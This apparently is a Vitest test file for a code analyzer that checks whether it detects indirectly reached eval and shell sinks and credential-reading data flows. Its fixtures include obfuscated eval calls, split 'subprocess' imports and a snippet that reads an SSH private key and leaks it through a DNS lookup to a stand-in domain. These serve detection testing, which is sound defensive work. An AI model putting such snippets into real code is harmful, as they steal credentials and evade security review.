import { describe, it, expect } from 'vitest';
import { analyzeCode } from './ast-analyzer.js';
import { analyzePythonDataFlow } from './python-sinks.js';

const execs = (code: string, file = 'x.js') => analyzeCode(code, file).filter(r => r.type === 'eval-exec');

describe('code and command sinks reached indirectly (1.4.3)', () => {
  it('eval under another name, through Reflect or Function.prototype helpers, or by an assembled global name', () => {
    expect(execs('const x = process.argv[2]; const e = eval; e(x);')).toHaveLength(1);
    expect(execs('const x = process.argv[2]; Reflect.apply(eval, null, [x]);')).toHaveLength(1);
    expect(execs('const x = process.argv[2]; eval.call(null, x);')).toHaveLength(1);
    expect(execs("const x = process.argv[2]; globalThis['ev' + 'al'](x);")).toHaveLength(1);
  });

  it('a local function named eval, or a Reflect.apply of anything else, is not', () => {
    expect(execs('function f(e) { const g = e; g(1); }')).toHaveLength(0);
    expect(execs('const eval2 = (s) => s; const e = eval2; e(1);')).toHaveLength(0);
    expect(execs('Reflect.apply(Math.max, null, [1, 2]);')).toHaveLength(0);
  });

  it('child_process handed to a then() callback of a dynamic import', () => {
    const found = execs("const x = process.argv[2]; import('node:child_process').then(m => m.execSync(x));", 'x.mjs');
    expect(found).toHaveLength(1);
    expect(execs("import('./util.js').then(m => m.execSync(1));", 'y.mjs')).toHaveLength(0);
  });

  it('Python importlib with the module name split into literals', () => {
    const flows = analyzePythonDataFlow("import importlib, sys\nsp = importlib.import_module('subpro' + 'cess')\nsp.run(sys.argv[1], shell=True)\n");
    expect(flows.some(f => f.type === 'eval-exec')).toBe(true);
  });
});

describe('file paths built with Array.join (1.4.3)', () => {
  it('classifies [HOME, ".ssh", "id_rsa"].join("/") as a credential read', () => {
    const code = [
      "const fs = require('fs'); const dns = require('dns');",
      "const HOME = require('os').homedir();",
      "const k = fs.readFileSync([HOME, '.ssh', 'id_rsa'].join('/'), 'utf8');",
      "dns.resolve(Buffer.from(k).toString('hex').slice(0, 60) + '.x.example.net', () => {});",
    ].join('\n');
    const flow = analyzeCode(code, 'j.js').find(r => r.type === 'source-to-sink');
    expect(flow?.sourcePath).toBe('credential');
  });
});
